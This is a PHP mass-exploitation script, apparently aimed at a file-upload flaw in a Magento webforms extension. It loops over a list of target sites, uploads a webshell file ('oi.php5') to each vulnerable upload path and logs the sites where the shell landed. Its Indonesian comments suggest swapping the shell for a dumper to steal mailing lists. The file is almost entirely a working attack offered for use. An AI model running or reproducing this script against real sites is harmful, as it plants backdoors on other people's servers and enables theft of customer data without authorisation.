<?php 
///origin idea by synchronizer sc0
///ganti input bug $vulnpages kalok bugnya ditempat laen
///array bisa ganti2
///ganti ekstensi shell kalok gak mau keupload di $shell gak harus shell kalao mau ngedump mailist tinggal upload magento dumper aja cek repo gw sebelumnya
error_reporting(0);
set_time_limit(0);
class ANAMPEDIA{
	
	private $vulnpages="/js/webforms/upload/";
	private $v_array="files[]";
	private $shell="oi.php5";
	
	public function simpan($data) {
	$fp = fopen("logs.txt", "a");
	fwrite($fp, $data."\n");
	fclose($fp);
	return;
	}
	public function eksekusi($url) {
	$anampediafile = new CURLFile(realpath($this->shell), 'text/html', $this->shell);
	$params = array(
        $this->v_array => $anampediafile
	);
	$uri = $url.$this->vulnpages;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $uri);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt($ch, CURLOPT_POST, true );
	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	$response_data = curl_exec($ch);
	
	return $response_data;
	curl_close($ch);
	}
}
	$get=file_get_contents($argv[1]) or die("\n[-] usage : php $argv[0] list.txt\n");
	$j=explode("\r\n",$get);
	foreach($j as $site){
	
	print "\n[?] Execute : ".$site;
	$exploiter = new ANAMPEDIA();
	$exploit = $exploiter->eksekusi($site);
	//print $exploit;
	$obj= json_decode($exploit,true);
	$checkstring = $obj[0]['url'];
	if(preg_match('#js/webforms/upload/files#',$checkstring)){
	print "\n[+] Result : \33[1;32m".$obj[0]['url']."\033[0m\n";
        $exploiter->simpan($checkstring);
	print "[+] Logs : \33[1;36mResult saved in logs.txt\033[0m [\33[1;33mOpen Using Notepad++\033[0m ]\n";
	}else {
	print "\n[-] Result : \33[1;33mNot Vulnerability"."\033[0m\n";
	
}
}
?>
